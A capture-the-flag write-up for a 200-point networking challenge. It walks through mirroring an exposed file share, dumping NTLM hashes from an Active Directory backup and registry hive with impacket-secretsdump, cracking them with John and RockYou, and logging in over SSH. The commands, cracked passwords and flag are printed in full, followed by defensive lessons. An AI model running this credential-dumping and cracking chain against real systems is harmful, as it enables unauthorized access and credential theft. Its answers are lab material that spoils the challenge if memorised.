# overSSHaring — Networking Challenge Write‑Up

> **Category:** Networking   |   **Points:** 200

---

## 0  Scenario Overview

The North Torbians have inadvertently exposed an Active Directory backup and registry hive via a public file share at `https://msoidentity.com/files/`. My goal was to leverage these artifacts to extract credentials for an SSH user and retrieve the CTF flag.

## 1  Recon & Preliminary Analysis

I mirrored the public share and enumerated its contents:

```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://msoidentity.com/files/
tree -L 1
```

Directory snapshot:

```
.
├── 46381.py
├── 46467.txt
├── 51632.py
├── 51697.txt
├── backup                # 16 MiB – ESE (AD backup)
├── config.json
├── configuration_deepseek.py
├── log.txt
├── opsec.txt
└── sys                   # 15 MiB – SYSTEM registry hive
```

* `log.txt` and `opsec.txt` revealed reused passwords: **s0ju** and **winter2024**.
* `config.json` contained only a model configuration—no credentials.
* The real vectors were the ESE database (`backup`) and the SYSTEM hive (`sys`).

## 2  Extracting Hashes

1. Identify formats:

   ```bash
   file backup   # ESE database
   file sys      # Windows registry hive
   ```

2. Dump NTLM hashes offline:

   ```bash
   impacket-secretsdump -ntds backup -system sys LOCAL > ntds.txt
   grep ssh_admin ntds.txt
   ```

Result:

```
torbintime.local\ssh_admin:1114:...:8dbd9a82a5d6f6bc4124d05d247883a0:::
```

## 3  Cracking

I first tried a custom wordlist:

```bash
printf "%s\n" s0ju s0ju! winter2024 winter2024! > custom.txt
john --format=NT --wordlist=custom.txt ssh_admin.hash
```

No luck. Then I installed and decompressed RockYou:

```bash
sudo apt install wordlists
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ssh_admin.hash
john --show ssh_admin.hash
```

John cracked it immediately:

```
ssh_admin:jucheteamo
```

## 4  Gaining Access & Flag

```bash
ssh ssh_admin@msoidentity.com
# Password: jucheteamo
cat ~/flag.txt
```

```
C1{f0ll0wing_th3_l34d5}
```

## 5  Lessons Learned

* **Public shares can leak entire AD backups.** Access to ESE + SYSTEM yields all credentials.
* **Crib‑drags and chat logs** accelerate password guessing.
* **Minimal tooling** (impacket + John) suffices against reused, human‑chosen passwords.
* Always enforce key‑only SSH or rotate away from `PasswordAuthentication yes`.
